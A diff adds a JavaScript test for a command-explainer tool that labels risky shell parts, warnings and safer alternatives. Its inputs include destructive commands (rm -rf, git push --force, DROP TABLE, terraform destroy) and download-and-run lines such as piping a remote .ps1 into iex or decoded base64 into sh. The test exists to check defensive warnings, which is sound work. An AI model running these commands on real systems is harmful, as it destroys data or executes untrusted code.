@@ -197,3 +197,29 @@ test("explain: breaks a command into parts in the asked language, unknown parts 
     server.close();
   }
 });
+
+test("explain: positions, what can go wrong, safer ways, runtime targets", () => {
+  const { explain, LANGS } = require("../src/explain");
+  const cmd = "rm -rf $BUILD_DIR/* && git push --force";
+  const x = explain(cmd, "en");
+  for (const p of x.parts) assert.strictEqual(cmd.slice(p.start, p.end).replace(/['"]/g, ""), p.text);
+  const rm = x.parts.find((p) => p.text === "rm");
+  assert.ok(rm.risky && /no undo/.test(rm.harm));
+  assert.ok(x.parts.find((p) => p.text === "$BUILD_DIR/*").risky);
+  assert.match(x.warnings.join(" "), /filled in only when it runs \(\$BUILD_DIR\/\*\)/);
+  assert.deepStrictEqual(x.safer.length, 2);
+  assert.match(x.safer.join(" "), /force-with-lease/);
+  // reading commands stay calm, a dry run needs no safer way
+  assert.ok(!explain("ls ~", "en").parts.some((p) => p.risky));
+  assert.deepStrictEqual(explain("Remove-Item -Recurse C:/tmp -WhatIf", "en").safer, []);
+  // PowerShell long flags are not split into letters
+  assert.match(explain("Get-ChildItem -Filter *.log", "en").parts[1].meaning, /-Filter/);
+  // new dictionary rows and hidden code
+  assert.ok(explain("psql -c 'DROP TABLE users'", "en").parts[2].risky);
+  assert.match(explain("echo aGk= | base64 -d | sh", "en").warnings[0], /cannot see/);
+  assert.match(explain("iwr https://x.example/a.ps1 | iex", "en").warnings[0], /internet/);
+  for (const [code] of LANGS) {
+    const y = explain("terraform destroy", code);
+    assert.ok(y.parts[1].harm && y.safer[0] && y.hint && y.harmLabel && y.saferTitle);
+  }
+});
